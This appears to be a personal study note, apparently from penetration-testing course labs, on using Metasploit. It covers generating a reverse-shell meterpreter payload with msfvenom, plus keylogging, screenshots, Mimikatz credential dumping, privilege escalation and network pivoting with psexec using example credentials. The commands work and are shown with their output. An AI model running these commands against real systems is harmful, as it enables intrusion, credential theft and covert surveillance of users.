---
creation date: December 20th 2022
last modified date: December 20th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Metasploit]]  
___

## Description:  

### Getting meterpreter session from shell

Use [revshells](https://www.revshells.com/) msfvenom session to generate a payload
`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.95 LPORT=9001 -f exe -o reverse.exe`
transfer the exe to the machine
``

### Basics
View categories
`show -h`
`show auxiliary`

To search for a module
`search portscan`

Use `info` to get more information
`msf5 > info exploit/windows/http/syncbreeze_bof`

To activate a module
`use auxiliary/scanner/portscan/tcp`
or you can search first and then just pick the number you want
`use 4`
`back` can be used to move out of the module and return to the main msf5 prompt.

To view details of a module
`show options`
`show advanced` to show more options.
`set`  and `unset` can be used to set and remove options.

`show payloads` can be used to retrieve a listing of all payloads that are compatible with the currently selected exploit module.

`check` can be used to verify whether or not the target host and application are vulnerable (will only work on certain modules).

use `run` or `exploit` to start the module once the options are set. `exploit -j` will run the job in the background.

use `jobs` to list background jobs, `jobs -i 0` to interact with a job, and `kill 0` to kill a job.

We can retrieve information regarding successful login  attempts from the database with `creds`.

### Meterpreter Commands

`help` will get a list of modules and commands

Useful commands:
```
sysinfo
getuid
upload /usr/share/windows-resources/binaries/nc.exe c:\\Users\\Offsec
download c:\\Windows\\system32\\calc.exe /tmp/calc.exe
edit edit.txt
search -f autoexec.bat
execute -f cmd.exe -i -H
```

use `shell` to drop into a system shell. This can be useful when our shells dies, we can return to the meterpreter session with `^c` or `exit`.

`background` can be used to background a session. Use `sessions -l` to list sessions, `session -i 5` to interact, and `session -k 1` to kill a session.

We can use `transport list` to switch protocols after our initial compromise.
To add a new transport protocol (this would be like choosing windows/meterpreter/reverse_tcp payload)
`meterpreter > transport add -t reverse_tcp -l 10.11.0.4 -p 5555`
We have to set up a listener to accept the connection.
```
meterpreter > background
[*] Backgrounding session 5...
msf5 exploit(windows/http/syncbreeze_bof) > use multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > exploit -j
msf5 exploit(multi/handler) > sessions -i 5
meterpreter > transport next
[*] Changing to next transport ...
[*] Sending stage (179779 bytes) to 10.11.0.22
[+] Successfully changed to the next transport, killing current session.
msf5 exploit(multi/handler) > sessions -i 6
```

### Post-Exploitation with Metasploit

^5b4372
Screenshot and keylogger
```
meterpreter > screenshot
Screenshot saved to:/root/.msf4/modules/exploits/windows/http/syncbreeze/beVjSnrB.jpeg


meterpreter > keyscan_start
Starting the keystroke sniffer ...
meterpreter > keyscan_dump
Dumping captured keystrokes...
ipconfig<CR>
whoami<CR>
meterpreter > keyscan_stop
Stopping the keystroke sniffer...
meterpreter >

```

Executing Powershell Commands
```
meterpreter > load powershell

meterpreter > help powershell
Powershell Commands
===================
 Command Description
 ------- -----------
 powershell_execute Execute a Powershell command string
 powershell_import Import a PS1 script or .NET Assembly DLL
 powershell_shell Create an interactive Powershell prompt

meterpreter > powershell_execute "$PSVersionTable.PSVersion"

```

Loading Mimikatz and dumping system credentials.
```
meterpreter > load kiwi
Loading extension kiwi...
Success.
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > creds_msv
```


### Pivoting

^8f3ca2

^6aac08
We will use route and add to create a path to the alternate internal network subnet we discovered. We will also specify the session ID that this route will apply to:
```
msf5 > route add 192.168.1.0/24 11
[*] Route added
msf5 > route print
```
We can now portscan into this network
```
msf5 > use auxiliary/scanner/portscan/tcp
msf5 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.1.110
RHOSTS => 192.168.1.110
msf5 auxiliary(scanner/portscan/tcp) > set PORTS 445,3389
PORTS => 445,3389
msf5 auxiliary(scanner/portscan/tcp) > run
```
We can also pivot using the psexec module:
```
msf5 > use exploit/windows/smb/psexec
msf5 exploit(windows/smb/psexec_psh) > set SMBDomain corp
SMBDomain => corp
msf5 exploit(windows/smb/psexec_psh) > set SMBUser jeff_admin
SMBUser => jeff_admin
msf5 exploit(windows/smb/psexec_psh) > set SMBPass Qwerty09!
SMBPass => Qwerty09!
msf5 exploit(windows/smb/psexec_psh) > set RHOSTS 192.168.1.110
RHOSTS => 192.168.1.110
msf5 exploit(windows/smb/psexec_psh) > set payload windows/meterpreter/bind_tcp
payload => windows/meterpreter/bind_tcp
msf5 exploit(windows/smb/psexec_psh) > set RHOST 192.168.1.110
LHOST => 192.168.1.110
msf5 exploit(windows/smb/psexec_psh) > set LPORT 444
LPORT => 444
msf5 exploit(windows/smb/psexec_psh) > exploit
```
It’s important to note that the added route will only work with established connections, meaning that a new shell. A reverse shell would not be able to find it's way back to the attacking machine.

As an alternative to adding routes manually, we can use the autoroute post-exploitation module, which can set up pivot routes through an existing meterpreter session automatically.

```
msf5 exploit(multi/handler) > use multi/manage/autoroute
msf5 post(multi/manage/autoroute) > show options
msf5 post(multi/manage/autoroute) > set session 4
msf5 post(multi/manage/autoroute) > exploit

```

Setup a socks proxy:
[[SOCKS Proxies#^8b8d22]]

Port forward:
[[Port Forwards#^651985]]





___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: December 20th 2022 (10:33 am)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
